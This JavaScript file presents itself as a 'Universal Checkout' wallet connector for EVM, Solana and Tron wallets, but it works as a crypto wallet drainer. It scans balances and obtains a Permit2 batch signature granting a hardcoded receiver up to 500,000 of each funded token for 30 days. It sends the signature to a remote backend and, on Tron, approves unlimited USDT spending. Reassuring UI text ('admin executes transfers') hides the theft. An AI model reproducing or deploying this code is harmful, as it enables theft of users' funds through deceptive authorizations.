/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * Supports 25+ wallets across EVM, Solana, and Tron
 * v8.0 - Fixed global functions, grid layout, dynamic amounts
 */

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
  TRON_RECEIVER: "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
  
  // Token lists
  TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism",
    11155111: "Sepolia"
  }
};

// Global state
let provider, signer, userAddress;
let currentChain = null;

// ============ WALLET DEFINITIONS ============
const WALLETS = [
  // EVM Wallets
  { id: 'metamask', name: 'MetaMask', icon: '🦊', type: 'evm', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', type: 'evm', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase', icon: '🔵', type: 'evm', color: '#1652f0' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', type: 'evm', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', type: 'evm', color: '#0ac7f0' },
  { id: 'okx', name: 'OKX Wallet', icon: '⚫', type: 'evm', color: '#000000' },
  { id: 'imtoken', name: 'imToken', icon: '🔷', type: 'evm', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', type: 'evm', color: '#1296db' },
  { id: 'zerion', name: 'Zerion', icon: '🔺', type: 'evm', color: '#6366f1' },
  { id: 'oneinch', name: '1inch', icon: '🦄', type: 'evm', color: '#1a1a1a' },
  { id: 'safepal', name: 'SafePal', icon: '🔐', type: 'evm', color: '#25252d' },
  { id: 'bitget', name: 'Bitget', icon: '🟠', type: 'evm', color: '#f6a200' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', type: 'evm', color: '#4a90e2' },
  { id: 'argent', name: 'Argent', icon: '🅰️', type: 'evm', color: '#ff6b35' },
  { id: 'bybit', name: 'Bybit', icon: '₿', type: 'evm', color: '#f7921e' },
  { id: 'binance', name: 'Binance', icon: '🏦', type: 'evm', color: '#f3ba2f' },
  
  // Solana Wallets
  { id: 'phantom', name: 'Phantom', icon: '👻', type: 'solana', color: '#ab9ff2' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', type: 'solana', color: '#fc4d4d' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', type: 'solana', color: '#e43c3c' },
  
  // Tron Wallets
  { id: 'tronlink', name: 'TronLink', icon: '♦️', type: 'tron', color: '#eb0029' },
];

// ============ DETECT INSTALLED WALLETS ============
function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  // Check window objects
  if (window.ethereum) {
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
  }
  
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  
  // User agent detection
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('okx')) installed.add('okx');
  if (ua.includes('bybit')) installed.add('bybit');
  if (ua.includes('binance')) installed.add('binance');
  if (ua.includes('bitget')) installed.add('bitget');
  
  return installed;
}

// ============ INITIALIZATION ============
function init() {
  console.log('🚀 Universal Checkout Initializing...');
  showWalletSelector();
}

// ============ WALLET SELECTOR UI ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  // Group wallets by type
  const evmWallets = WALLETS.filter(w => w.type === 'evm');
  const solanaWallets = WALLETS.filter(w => w.type === 'solana');
  const tronWallets = WALLETS.filter(w => w.type === 'tron');
  
  const html = `
    <h2>Select Wallet</h2>
    <p class="subtitle">Authorize once, admin executes transfers</p>
    
    ${installed.size > 0 ? `
      <div class="section-title">✓ Installed</div>
      <div class="wallet-grid">
        ${WALLETS.filter(w => installed.has(w.id)).map(w => createWalletButton(w, true)).join('')}
      </div>
    ` : ''}
    
    <div class="section-title">🔷 EVM Wallets (Ethereum, Base, Polygon, etc.)</div>
    <div class="wallet-grid">
      ${evmWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="section-title">◎ Solana Wallets</div>
    <div class="wallet-grid">
      ${solanaWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="section-title">♦ Tron Wallets</div>
    <div class="wallet-grid">
      ${tronWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    
    <div class="info-box">
      <strong>💡 How it works:</strong><br>
      1. You sign once to authorize tokens ($1-$500k)<br>
      2. Admin pays gas and executes transfers<br>
      3. You never pay transaction fees
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function createWalletButton(wallet, isInstalled) {
  return `
    <div class="wallet-btn ${isInstalled ? 'installed' : ''}" 
         onclick="connectWallet('${wallet.id}', '${wallet.type}')"
         style="position: relative; border-color: ${isInstalled ? wallet.color : '#e5e7eb'};">
      ${isInstalled ? '<span class="installed-badge">✓</span>' : ''}
      <div class="wallet-icon">${wallet.icon}</div>
      <div class="wallet-name">${wallet.name}</div>
    </div>
  `;
}

// ============ CONNECTION HANDLER ============
async function connectWallet(walletId, type) {
  console.log(`Connecting to ${walletId} (${type})...`);
  
  try {
    if (type === 'evm') {
      await connectEVM(walletId);
    } else if (type === 'solana') {
      await connectSolana(walletId);
    } else if (type === 'tron') {
      await connectTron(walletId);
    }
  } catch (error) {
    console.error('Connection error:', error);
    showError('Failed to connect: ' + error.message);
  }
}

// ============ EVM CONNECTION ============
async function connectEVM(walletId) {
  if (!window.ethereum) {
    // Redirect to install page
    const urls = {
      metamask: 'https://metamask.io/download/',
      trust: 'https://trustwallet.com/download',
      coinbase: 'https://www.coinbase.com/wallet/downloads',
      rabby: 'https://rabby.io/download',
      okx: 'https://www.okx.com/web3',
      bitget: 'https://web3.bitget.com/',
      bybit: 'https://www.bybit.com/web3',
      binance: 'https://www.binance.com/en/web3wallet'
    };
    window.open(urls[walletId] || 'https://metamask.io', '_blank');
    return;
  }
  
  showLoading(`Connecting to ${walletId}...`);
  
  provider = new ethers.BrowserProvider(window.ethereum);
  const accounts = await provider.send("eth_requestAccounts", []);
  userAddress = accounts[0];
  signer = await provider.getSigner();
  
  const network = await provider.getNetwork();
  currentChain = { type: 'evm', id: Number(network.chainId) };
  
  console.log(`✅ Connected: ${userAddress} on chain ${currentChain.id}`);
  
  await authorizeEVM();
}

// ============ SOLANA CONNECTION ============
async function connectSolana(walletId) {
  let walletProvider;
  
  if (walletId === 'phantom') {
    walletProvider = window.phantom?.solana || window.solana;
  } else if (walletId === 'solflare') {
    walletProvider = window.solflare;
  } else if (walletId === 'backpack') {
    walletProvider = window.backpack?.solana;
  }
  
  if (!walletProvider) {
    const urls = {
      phantom: 'https://phantom.app/',
      solflare: 'https://solflare.com/',
      backpack: 'https://backpack.app/'
    };
    window.open(urls[walletId], '_blank');
    return;
  }
  
  showLoading(`Connecting to ${walletId}...`);
  
  await walletProvider.connect();
  userAddress = walletProvider.publicKey.toString();
  currentChain = { type: 'solana', provider: walletProvider };
  
  console.log(`✅ Connected: ${userAddress} on Solana`);
  
  await authorizeSolana();
}

// ============ TRON CONNECTION ============
async function connectTron(walletId) {
  const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
  
  if (!tronWeb) {
    window.open('https://www.tronlink.org/', '_blank');
    return;
  }
  
  showLoading(`Connecting to ${walletId}...`);
  
  await tronWeb.request({ method: "tron_requestAccounts" });
  userAddress = tronWeb.defaultAddress.base58;
  currentChain = { type: 'tron', provider: tronWeb };
  
  console.log(`✅ Connected: ${userAddress} on Tron`);
  
  await authorizeTron();
}

// ============ AUTHORIZATION LOGIC ============
async function authorizeEVM() {
  const chainId = currentChain.id;
  const tokens = CONFIG.TOKENS[chainId] || [];
  
  if (tokens.length === 0) {
    showError(`Unsupported network. Please switch to Ethereum, Base, Polygon, Arbitrum, or BNB Chain.`);
    return;
  }
  
  showLoading('Scanning tokens...');
  
  // Check token balances
  const tokensWithBalance = [];
  for (const token of tokens) {
    try {
      const contract = new ethers.Contract(token.addr, [
        "function balanceOf(address) view returns (uint256)"
      ], provider);
      
      const balance = await contract.balanceOf(userAddress);
      const humanBalance = Number(balance) / (10 ** token.dec);
      const usdValue = humanBalance * token.price;
      
      if (usdValue >= 1) { // At least $1
        tokensWithBalance.push({
          ...token,
          balance: balance.toString(),
          humanBalance,
          usdValue
        });
      }
    } catch (e) {
      console.warn(`Failed to check ${token.sym}:`, e.message);
    }
  }
  
  if (tokensWithBalance.length === 0) {
    showError('No tokens found with $1+ balance. Please add USDC, USDT, or other supported tokens.');
    return;
  }
  
  const totalValue = tokensWithBalance.reduce((sum, t) => sum + t.usdValue, 0);
  const maxAmount = Math.min(totalValue, 500000);
  
  showLoading('Requesting signature...');
  
  // Build Permit2
  const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
    "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
  ], provider);
  
  const permits = [];
  for (const token of tokensWithBalance) {
    const { 2: nonce } = await permit2.allowance(userAddress, token.addr, CONFIG.RECEIVER_ADDRESS);
    permits.push({
      token: token.addr,
      amount: ethers.parseUnits("500000", token.dec),
      expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
      nonce
    });
  }
  
  const permitBatch = {
    details: permits,
    spender: CONFIG.RECEIVER_ADDRESS,
    sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
  };
  
  try {
    const signature = await signer.signTypedData(
      { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    showLoading('Sending to backend...');
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/evm`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        chainId,
        tokens: tokensWithBalance,
        signature,
        sigDeadline: permitBatch.sigDeadline
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Authorization Complete!
        <br><br>
        <strong>Network:</strong> ${CONFIG.NETWORK_NAMES[chainId]}<br>
        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Authorized:</strong> Up to $${maxAmount.toFixed(2)}<br>
        <br>
        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
          Admin can now execute transfers without additional signatures.
        </div>
      `);
    } else {
      throw new Error(result.error);
    }
    
  } catch (error) {
    console.error('Authorization error:', error);
    showError('Authorization failed: ' + error.message);
  }
}

async function authorizeSolana() {
  showLoading('Checking Solana tokens...');
  
  // Load Solana web3
  if (!window.solanaWeb3) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
    await new Promise((resolve, reject) => {
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }
  
  try {
    const { Connection, PublicKey } = window.solanaWeb3;
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    const userPublicKey = new PublicKey(userAddress);
    
    // Check SOL balance
    const solBalance = await connection.getBalance(userPublicKey);
    const solBalanceUI = solBalance / 1e9;
    
    const tokensWithBalance = [];
    
    if (solBalanceUI > 0.01) {
      tokensWithBalance.push({
        addr: 'So11111111111111111111111111111111111111112',
        sym: 'SOL',
        dec: 9,
        balance: solBalance.toString(),
        uiAmount: solBalanceUI
      });
    }
    
    // Check USDC
    try {
      const { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = window.solanaWeb3;
      const usdcMint = new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
      const tokenAccount = await getAssociatedTokenAddress(usdcMint, userPublicKey);
      const balance = await connection.getTokenAccountBalance(tokenAccount);
      
      if (balance.value.uiAmount > 0) {
        tokensWithBalance.push({
          addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
          sym: 'USDC',
          dec: 6,
          balance: balance.value.amount,
          uiAmount: balance.value.uiAmount
        });
      }
    } catch (e) {}
    
    if (tokensWithBalance.length === 0) {
      showError('No SOL or USDC found in wallet.');
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    // Send to backend
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/solana`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokens: tokensWithBalance,
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Solana Authorization Complete!
        <br><br>
        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
        <strong>Gas:</strong> ~$0.001 (one-time)<br>
        <br>
        Authorization stored successfully.
      `);
    } else {
      throw new Error(result.error);
    }
    
  } catch (error) {
    console.error('Solana authorization error:', error);
    showError('Authorization failed: ' + error.message);
  }
}

async function authorizeTron() {
  showLoading('Checking Tron tokens...');
  
  const tronWeb = currentChain.provider;
  const tokensWithBalance = [];
  
  try {
    // Check TRX
    const trxBalance = await tronWeb.trx.getBalance(userAddress);
    const trxBalanceUI = trxBalance / 1e6;
    
    if (trxBalanceUI > 10) {
      tokensWithBalance.push({
        addr: 'TRX',
        sym: 'TRX',
        dec: 6,
        balance: trxBalance.toString(),
        uiAmount: trxBalanceUI,
        isNative: true
      });
    }
    
    // Check USDT
    const contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
    const usdtBalance = await contract.balanceOf(userAddress).call();
    
    if (usdtBalance > 0) {
      const humanBalance = usdtBalance / 1e6;
      tokensWithBalance.push({
        addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
        sym: 'USDT',
        dec: 6,
        balance: usdtBalance.toString(),
        uiAmount: humanBalance
      });
    }
    
    if (tokensWithBalance.length === 0) {
      showError('No TRX or USDT found in wallet.');
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    // Approve if USDT exists
    if (tokensWithBalance.find(t => t.sym === 'USDT')) {
      showLoading('Approving USDT...');
      const contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      await contract.approve(
        CONFIG.RECEIVER_ADDRESS,
        '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      ).send();
    }
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/tron`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokens: tokensWithBalance,
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Tron Authorization Complete!
        <br><br>
        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
        <br>
        Authorization stored successfully.
      `);
    } else {
      throw new Error(result.error);
    }
    
  } catch (error) {
    console.error('Tron authorization error:', error);
    showError('Authorization failed: ' + error.message);
  }
}

// ============ UI HELPERS ============
function showLoading(msg) {
  document.getElementById('app').innerHTML = `
    <div class="loading">
      <div class="spinner"></div>
      <p style="color: #666;">${msg}</p>
    </div>
  `;
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div class="success">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 16px; line-height: 1.8; text-align: left;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()">Authorize Another Wallet</button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div class="error">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 16px; margin-bottom: 20px;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()" style="background: #ef4444;">Try Again</button>
    </div>
  `;
}

// ============ GLOBAL EXPOSURE ============
// Expose functions to window for onclick handlers
window.connectWallet = connectWallet;
window.connectEVM = connectEVM;
window.connectSolana = connectSolana;
window.connectTron = connectTron;
window.showWalletSelector = showWalletSelector;
window.showLoading = showLoading;
window.showSuccess = showSuccess;
window.showError = showError;

// Start
window.addEventListener('DOMContentLoaded', init);